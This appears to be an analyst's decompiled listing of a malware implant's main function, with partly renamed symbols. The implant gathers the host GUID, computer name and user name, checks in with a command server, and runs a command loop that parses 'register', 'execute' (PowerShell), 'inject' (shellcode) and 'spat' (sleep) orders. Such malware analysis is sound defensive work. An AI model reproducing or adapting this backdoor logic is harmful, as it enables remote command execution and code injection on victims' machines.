
void startexam_main(void)

{
  bool bVar1;
  uint uVar2;
  longlong lVar3;
  void **ppvVar4;
  ulonglong uVar5;
  longlong *plVar6;
  char *_Str;
  ulonglong *puVar7;
  undefined8 *puVar8;
  SIZE_T SVar9;
  LPCVOID pvVar10;
  void *local_338 [4];
  void *local_318 [4];
  char *local_2f8 [4];
  void *local_2d8 [4];
  void *local_2b8 [4];
  void *local_298 [4];
  void *local_278 [4];
  ulonglong local_258 [4];
  longlong local_238 [4];
  longlong local_218 [4];
  longlong local_1f8 [4];
  longlong computer_name_a [4];
  longlong m_guid [4];
  void *u_name [6];
  void *local_168 [4];
  longlong *m_guid_buff [4];
  longlong *local_128 [4];
  longlong *local_108 [4];
  longlong *local_e8 [4];
  void *local_c8 [4];
  void *local_a8 [4];
  void *local_88 [4];
  longlong *local_68 [4];
  longlong *local_48 [4];
  DWORD local_24;
  ulonglong local_20;
  
  FreeConsole();
  query_machine_guid(m_guid);
  get_computer_name(computer_name_a);
  user_name_a((longlong *)u_name);
  some_concat_func(computer_name_a,u_name);
  free_var(u_name);
  Sleep(60000);
  return_func();
  some_buff_cpy_func(local_1f8,"");
  _another_return();
  return_func();
  some_buff_cpy_func(local_218,"OK");
  _another_return();
  while (uVar2 = FUN_30d4d8c80(local_1f8,local_218), (char)uVar2 != '\0') {
    buff_cpy(m_guid_buff,m_guid);
    SUS_CONNECTIONS((longlong *)local_168,(longlong *)m_guid_buff);
    FUN_30d4d3ea0(local_1f8,local_168);
    free_var(local_168);
    free_var(m_guid_buff);
    Sleep(1000);
  }
  FUN_30d4d3590(local_238);
  FUN_30d4d3590((longlong *)local_258);
  do {
    buff_cpy(local_128,m_guid);
    buff_cpy(local_108,local_258);
    FUN_30d4b18d4((longlong *)local_338,local_108,(longlong *)local_128);
    free_var(local_108);
    free_var(local_128);
    buff_cpy(local_e8,local_338);
    FUN_30d4b40ba(local_278,(longlong *)local_e8);
    free_var(local_e8);
    FUN_30d4d0b20((longlong *)local_c8,(longlong *)local_278);
    FUN_30d4b3f03((longlong *)local_318,(longlong *)local_c8);
    FUN_30d4d0cb0(local_c8);
    FUN_30d4cfdc0(local_298);
    return_func();
    some_buff_cpy_func((longlong *)local_2f8,"<ch0nky>");
    _another_return();
    local_20 = 0;
    FUN_30d4d3590((longlong *)local_2d8);
    while (local_20 = FUN_30d4c8c30((longlong *)local_318,local_2f8,0),
          local_20 != 0xffffffffffffffff) {
      FUN_30d4c8ea0((longlong *)local_a8,(longlong *)local_318,0,local_20);
      FUN_30d4d3ea0(local_2d8,local_a8);
      free_var(local_a8);
      FUN_30d4cfd40(local_298,local_2d8);
      lVar3 = FUN_30d4c8e80((longlong)local_2f8);
      FUN_30d4d1d80((longlong *)local_318,0,local_20 + lVar3);
    }
    lVar3 = FUN_30d4c8000((longlong *)local_298);
    if (lVar3 == 0) {
      FUN_30d4d3f60(local_258,"");
    }
    else {
      ppvVar4 = (void **)FUN_30d4cfe30((longlong *)local_298,0);
      bVar1 = FUN_30d4d8bf0(ppvVar4,"register");
      if (bVar1) {
        uVar5 = FUN_30d4c8000((longlong *)local_298);
        if (1 < uVar5) {
          plVar6 = (longlong *)FUN_30d4cfe30((longlong *)local_298,1);
          _Str = (char *)FUN_30d4d4020(plVar6,0);
          local_24 = atol(_Str);
          Sleep(local_24);
        }
        puVar7 = FUN_30d4d9430(4);
        *(undefined4 *)puVar7 = 1;
                    /* WARNING: Subroutine does not return */
        FUN_30d4d9950((longlong)puVar7,&PTR_PTR_LAB_30d4dff00,0);
      }
      ppvVar4 = (void **)FUN_30d4cfe30((longlong *)local_298,0);
      bVar1 = FUN_30d4d8bf0(ppvVar4,"execute");
      if (bVar1) {
        uVar5 = FUN_30d4c8000((longlong *)local_298);
        if (uVar5 < 2) {
          FUN_30d4d3f60(local_258,"no args");
        }
        else {
          puVar8 = (undefined8 *)FUN_30d4cfe30((longlong *)local_298,1);
          buff_cpy(local_68,puVar8);
          main_powershell(local_88,local_68);
          FUN_30d4d3ea0(local_258,local_88);
          free_var(local_88);
          free_var(local_68);
        }
      }
      else {
        ppvVar4 = (void **)FUN_30d4cfe30((longlong *)local_298,0);
        bVar1 = FUN_30d4d8bf0(ppvVar4,"inject");
        if (bVar1) {
          uVar5 = FUN_30d4c8000((longlong *)local_298);
          if (uVar5 < 2) {
            FUN_30d4d3f60(local_258,"no args");
          }
          else {
            puVar8 = (undefined8 *)FUN_30d4cfe30((longlong *)local_298,1);
            buff_cpy(local_48,puVar8);
            FUN_30d4b40ba(local_2b8,(longlong *)local_48);
            free_var(local_48);
            SVar9 = FUN_30d4c8280((longlong *)local_2b8);
            pvVar10 = (LPCVOID)FUN_30d4d0d00((longlong *)local_2b8,0);
            FUN_30d4b42aa(pvVar10,SVar9);
            FUN_30d4d3f60(local_258,"OK");
            FUN_30d4d0cb0(local_2b8);
          }
        }
        else {
          ppvVar4 = (void **)FUN_30d4cfe30((longlong *)local_298,0);
          bVar1 = FUN_30d4d8bf0(ppvVar4,"spat");
          if (bVar1) {
            Sleep(60000);
            FUN_30d4d3f60(local_258,"OK");
          }
          else {
            FUN_30d4d3f60(local_258,"Unknown command");
          }
        }
      }
    }
    free_var(local_2d8);
    free_var(local_2f8);
    FUN_30d4cfde0(local_298);
    free_var(local_318);
    FUN_30d4d0cb0(local_278);
    free_var(local_338);
  } while( true );
}


